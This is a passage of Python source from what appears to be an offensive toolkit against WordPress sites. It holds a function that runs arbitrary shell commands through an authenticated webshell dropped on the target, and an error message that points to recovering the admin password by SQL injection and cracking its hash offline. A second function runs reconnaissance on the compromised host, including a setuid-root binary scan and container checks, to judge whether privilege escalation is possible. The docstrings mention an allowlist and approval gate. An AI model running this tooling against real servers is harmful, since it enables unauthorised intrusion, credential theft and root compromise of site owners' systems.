        return {"status": "error", "error": "admin_password is required — recover it via wp_batch_sqli_read(preset='users') and crack the hash offline"}
    cmd = params.get("cmd", "id")

    try:
        with _client(params) as client:
            outputs = _run_authenticated_plugin_commands(client, base, admin_user, admin_password, [("cmd", cmd)])
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_shell: target=%s request failed: %s", base, exc)
        return {"status": "error", "error": f"request failed: {exc}"}

    if "_error" in outputs:
        return {"status": "error", "error": outputs["_error"]}

    logger.debug("wp_batch_shell: target=%s RCE confirmed via known credential", base)
    return {"status": "ok", "target": base, "command": cmd, "output": outputs.get("cmd", "")}


_ROOT_PREREQ_COMMANDS: list[tuple[str, str]] = [
    ("uid", "id; id -u"),
    ("uname", "uname -srm"),
    ("arch", "uname -m"),
    ("python", "python3 --version 2>&1 || python --version 2>&1 || true"),
    ("suid_scan", "find /usr /bin /sbin /opt /snap -xdev -perm -4000 -user root -type f 2>/dev/null | head -50"),
    ("container", "cat /proc/1/cgroup 2>/dev/null | head -20; test -f /.dockerenv && echo DOCKERENV_PRESENT || true"),
]
_ROOT_PREREQ_SUPPORTED_ARCHS = {"x86_64", "i386", "i686", "armv5l", "armv6l", "armv7l", "arm", "aarch64"}


def _assess_root_prereqs(outputs: dict) -> tuple[list[tuple[str, str, bool]], bool, list[str]]:
    uid_text = outputs.get("uid", "")
    uname = outputs.get("uname", "").lower()
    arch = (outputs.get("arch", "").strip().splitlines() or [""])[-1].strip()
    python_version = outputs.get("python", "")
    suid_lines = [line.strip() for line in outputs.get("suid_scan", "").splitlines() if line.strip().startswith("/")]

    uid_match = re.search(r"uid=(\d+)|^(\d+)$", uid_text, re.M)
    uid = next((g for g in uid_match.groups() if g), None) if uid_match else None

    checks = [
        ("remote-code-execution", "confirmed" if uid_text else "unknown", bool(uid_text)),
        ("non-root-web-user", f"uid={uid}" if uid else "unknown", uid is not None and uid != "0"),
        ("linux-kernel", uname.strip() or "unknown", "linux" in uname),
        ("supported-architecture", arch or "unknown", arch in _ROOT_PREREQ_SUPPORTED_ARCHS),
        ("python-runtime", python_version.strip() or "not found", "Python " in python_version or bool(re.search(r"\b3\.\d+\.\d+\b", python_version))),
        ("setuid-root-targets", f"{len(suid_lines)} found", bool(suid_lines)),
    ]
    exploitable = all(ok for _, _, ok in checks)
    return checks, exploitable, suid_lines


def wp_batch_root_prereq(params: dict) -> dict:
    """Benign shell-to-root prerequisite check — runs read-only diagnostics (uid, kernel, arch,
    Python runtime, setuid-root binaries, container indicators) through the SAME authenticated
    webshell drop wp_batch_shell uses. Never runs a local privilege-escalation exploit itself, only
    reports whether the prerequisites for one appear present. Same allowlist + approval gate as
    sqlmap.
    """
    base = _base_url(params["target"])
    admin_user = params.get("admin_user", "admin")
    admin_password = params.get("admin_password")
    if not admin_password:
        return {"status": "error", "error": "admin_password is required — recover it via wp_batch_sqli_read(preset='users') and crack the hash offline"}

    try:
        with _client(params) as client:
            outputs = _run_authenticated_plugin_commands(client, base, admin_user, admin_password, _ROOT_PREREQ_COMMANDS)
    except httpx.HTTPError as exc:
        logger.debug("wp_batch_root_prereq: target=%s request failed: %s", base, exc)
        return {"status": "error", "error": f"request failed: {exc}"}

    if "_error" in outputs:
        return {"status": "error", "error": outputs["_error"]}

    checks, exploitable, suid_lines = _assess_root_prereqs(outputs)
    logger.debug("wp_batch_root_prereq: target=%s exploitable=%s", base, exploitable)
    return {
        "status": "ok", "target": base, "exploitable": exploitable,
        "checks": [{"name": n, "detail": d, "ok": ok} for n, d, ok in checks],
        "suid_root_candidates": suid_lines,
        "container_indicators": outputs.get("container", "").strip(),
        "note": "diagnostics only — no local privilege escalation was executed",
    }
